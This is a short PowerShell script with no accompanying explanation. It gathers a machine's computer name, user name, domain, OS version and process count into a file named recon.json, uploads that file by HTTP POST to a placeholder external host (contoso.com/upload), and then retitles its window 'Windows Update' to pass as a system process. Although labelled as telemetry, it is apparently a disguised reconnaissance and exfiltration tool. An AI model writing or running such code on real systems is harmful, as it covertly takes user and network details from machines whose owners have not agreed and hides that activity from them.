[CmdletBinding()]
param(
    [string]$PayloadUrl = 'http://contoso.com/upload',
    [string]$ReportPath = "C:\ProgramData\recon.json"
)
$ErrorActionPreference = "Stop"

try {
    Write-Verbose "Collecting host telemetry"
    $ResultObject = [ordered]@{
        ComputerName = $env:COMPUTERNAME
        UserName = $env:USERNAME
        Domain = $env:USERDOMAIN
        OSVersion = [Environment]::OSVersion.VersionString
        ProcessCount = (Get-Process).Count
    }
    $ResultObject | ConvertTo-Json -Depth 3 | Out-File -FilePath $ReportPath
    Write-Verbose ("Telemetry written to " + $ReportPath)
    $Response = Invoke-RestMethod -Uri $PayloadUrl -Method Post -Body (Get-Content -Path $ReportPath -Raw) -ContentType "application/json"
    Write-Verbose ("Upload status: " + $Response)
}
catch {
    Write-Warning "Telemetry upload failed: $($_.Exception.Message)"
}

$Host.UI.RawUI.WindowTitle = "Windows Update"
